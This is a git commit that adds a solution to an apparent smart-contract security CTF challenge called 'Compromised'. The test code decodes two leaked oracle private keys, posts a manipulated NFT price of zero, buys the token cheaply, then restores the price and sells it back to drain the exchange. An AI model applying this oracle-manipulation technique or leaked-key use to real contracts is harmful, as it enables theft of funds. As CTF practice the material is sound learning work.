fe11ed93a3d5b73847603348ae5a96b3cfa0d8c4
amankakar <amankhan1017@gmail.com>
2023-09-07 16:36:55 +0500

    challenge #7:solved

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -1,6 +1,7 @@
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+const { Wallet, utils } = ethers;
 
 describe('Compromised challenge', function () {
     let deployer, player;
@@ -11,7 +12,7 @@ describe('Compromised challenge', function () {
         '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
         '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
     ];
-
+ 
     const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
     const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
     const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
@@ -53,6 +54,24 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+// private key in bytes : 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+//  private key 2 : 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+
+// convert to string and decode base64 you will get hex private
+const key1="0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
+const key2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"        
+const HACKED_PRICE = 1n * 10n ** 1n;
+
+const walletOrcale1 = new Wallet(key1 , ethers.provider);
+const walletOrcale2 = new Wallet(key2 , ethers.provider);
+await oracle.connect(walletOrcale1).postPrice("DVNFT" , 0 )
+await oracle.connect(walletOrcale2).postPrice("DVNFT" , 0 )
+await exchange.connect(player).buyOne({value:HACKED_PRICE})
+await oracle.connect(walletOrcale1).postPrice("DVNFT" , INITIAL_NFT_PRICE )
+await oracle.connect(walletOrcale2).postPrice("DVNFT" , INITIAL_NFT_PRICE )
+await nftToken.connect(player).approve(exchange.address , 0);
+await exchange.connect(player).sellOne(0)
+
     });
 
     after(async function () {
